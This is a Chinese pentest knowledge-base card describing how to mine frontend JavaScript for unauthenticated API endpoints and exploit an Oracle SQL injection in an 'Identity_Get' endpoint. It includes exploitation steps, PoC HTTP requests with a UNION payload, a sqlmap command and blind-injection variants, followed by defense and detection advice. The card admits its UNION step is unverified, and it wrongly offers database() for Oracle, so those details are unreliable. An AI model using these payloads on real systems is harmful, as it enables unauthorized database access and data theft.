---
id: web-generic-sqli-frontend-js-hidden-identity-get-oracle-union
title: 前端 JS 暴露的 Identity_Get 未授权接口：单引号报错确认 Oracle 字符串型注入并 UNION 取数
type: scenario
domain: web
path: web/generic/sqli
technique: frontend-js-hidden-api-unauth-sqli
tags:
- web
- sqli
- oracle
- frontend-js
- api-discovery
- union
- unauthorized
- error-based
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:29:21+08:00'
  notes: 已对照原文核对；原文 Identity_Get?USERID=1&RESEARCHID=1 未带会话即返回业务数据，单引号后响应回 ORA-01756 确认 Oracle 拼接注入，sqlmap 识别 USERID 的 boolean/error/time-based，--current-user 取到 MK，与卡片链路一致；未验证点：原文未给出 UNION 十列回显的实际截图，卡片中 UNION 取数步骤属手法补全
url: /docs/web/generic/sqli/web-generic-sqli-frontend-js-hidden-identity-get-oracle-union/
draft: false
kb_aliases:
- JS 源码挖未授权接口 SQL 注入
- Identity_Get USERID RESEARCHID 注入
- 前端接口表 SQLi
- Oracle 字符串型 UNION 注入
---

## 一句话结论

目标站登录框拿不到口令、目录扫描也没有结果时，从前端 JS（如 `const.js`/业务打包文件）里能直接读到后端接口路径与参数名；其中 `Identity_Get?USERID=&RESEARCHID=` 这类「查询类」接口往往只校验前端页面、不校验会话，把单引号塞进参数即触发 Oracle 报错，确认是字符串拼接的 SQL 注入，再按报错/回显做 UNION 或交给 sqlmap 取库。

## 原理

- 前端工程化后，接口表、参数名、甚至调试用的注释都会被原样打进 JS 产物：页面只渲染「经过登录页」的入口，但 JS 里保留了全部 `URL + 参数` 对照关系，因此不登录也能枚举出后端未做鉴权的查询接口。
- 这类接口的典型实现是 `SELECT ... WHERE USERID = '<USERID>' AND RESEARCHID = '<RESEARCHID>'`，参数不经参数化查询，单引号直接闭合字符串字面量；Oracle 在语法错误时把 `ORA-00933/ORA-00936` 等原文回给响应，形成可判定的报错型注入。
- 能报错就说明输入到达 SQL 层；随后 `ORDER BY` 试探列数、`UNION SELECT` 用同列数的字面量占位，因为响应里某些字段会被页面/JSON 直接回显（如名称类字段），把占位符替换成 `database()`、`user`、`SELECT ... FROM all_tables` 即可逐列取数。
- Oracle 的差异点：没有 `information_schema`，列数靠 `ORDER BY` 或 `UNION SELECT NULL...` 递增；字符串拼接常用 `||`，取当前用户 `SELECT user FROM dual`，取库表要读 `all_tables/all_tab_columns`；报错信息会带出 `ORA-` 前缀，可直接作为注入成功的判据。
- 危害不止读库：响应里若能回显任意查询结果，就可枚举账号表、拖取口令散列或业务数据；若数据库账号权限高（常见于内网自研系统），还能读到其它 schema。

## 触发条件

- 目标前端 JS 产物可直接下载（无鉴权、无打包加密），且其中含后端接口路径与参数名。
- 对应接口未做会话/权限校验（或只在前端做跳转控制），参数进入 SQL 字符串拼接。
- 数据库为 Oracle（报错内容含 `ORA-`；其它库同理但 payload 与取数语法不同）。
- 存在可回显字段或可稳定判定的报错差异。

## 利用步骤

1. 抓取页面加载的全部 JS（含 `const.js`、`app.*.js`、`chunk-vendors.js`），用正则 `(?:https?:)?//?[\w./-]+|/[A-Za-z][\w./-]*\?` 与 `USERID|RESEARCHID|userid|researchid` 这类参数名交叉筛选出接口表。
2. 把候选路径直接拼到目标域名，不带 Cookie 发一次正常请求，确认返回 200 且是业务数据（而不是登录页/403），即接口未授权。
3. 对每个参数插入单引号：`?USERID=1'`，观察响应是否出现 `ORA-` 报错或 500 差异；再插 `1'||'`、`1' AND 1=1` / `1' AND 1=2` 判断布尔差异。
4. `ORDER BY n` 递增确定列数；用 `UNION SELECT` 逐个占位符替换为 `'a'`、再替换为 `user`、`database()`，找到回显位。
5. 用回显位取 `SELECT user FROM dual`、`SELECT table_name FROM all_tables WHERE rownum<20` 验证取数能力；后续可按需枚举业务表，控制请求量。
6. 若手工确认注入但取数繁琐，可用 sqlmap 指定该 URL 与参数（`-p`、`--dbms=Oracle`）复跑，先 `--current-user` 再按需 `--tables`。

## PoC

最小探测（不带会话）：

```http
GET /Api/xxx/xxx/xxx/Identity_Get?USERID=1&RESEARCHID=1 HTTP/1.1
Host: target
```

确认注入：

```http
GET /Api/xxx/xxx/xxx/Identity_Get?USERID=1%27&RESEARCHID=1 HTTP/1.1
Host: target
```

报错型确认后，按列数构造 UNION（列数需先用 `ORDER BY` 实测；占位符按回显字段调整）：

```http
GET /Api/xxx/xxx/xxx/Identity_Get?USERID=1%27%20UNION%20SELECT%20NULL,user,NULL,NULL%20FROM%20dual--&RESEARCHID=1 HTTP/1.1
Host: target
```

sqlmap 复跑（先确认用户）：

```
sqlmap -u "http://target/Api/xxx/xxx/xxx/Identity_Get?USERID=1&RESEARCHID=1" -p USERID --dbms=Oracle --current-user
```

## 变体与关联

- 变体：同一 JS 里其它查询接口（按 ID/日期/编号查询）常复用同一套拼接写法，报错点可能成片存在；找到一处后按参数名扫其余端点。
- 变体：把参数放进 POST body 或 JSON 字段时，注入点判定方式不变，只是不再出现在 URL 里。
- 变体：若接口有回显 JSON 但报错被吞，改用时间盲注（Oracle 用 `dbms_pipe.receive_message` 或重查询延时）。
- 关联：[[pentest-recon-vue-spa-router-service-api-extraction]]（从打包 JS 提取完整 API 路由表并筛未授权端点，属本卡的前置步骤）。
- 关联：[[web-generic-sqli-login-username-comment-universal-password]]（登录处注入的同类入口，但本卡入口在未授权查询接口）。

## 检测与防御

- 防御：所有查询接口统一走参数化查询/预编译（Oracle 用 `PreparedStatement` 或 ORM 绑定），禁止字符串拼接。
- 防御：接口级鉴权，不能只靠前端跳转；未登录会话访问查询接口应返回 401/403。
- 防御：关闭生产环境 SQL 报错回显，统一异常页；数据库账号最小权限，禁止跨 schema 读。
- 检测：WAF/日志中对 `'`、`%27`、`union`、`order by`、`ora-` 关键字组合告警；关注无 Cookie 请求直接命中接口路径的行为。
- 检测：审计前端 JS 中暴露的接口表并比对后端鉴权配置，把「JS 里有、网关没拦」的端点列为风险清单。
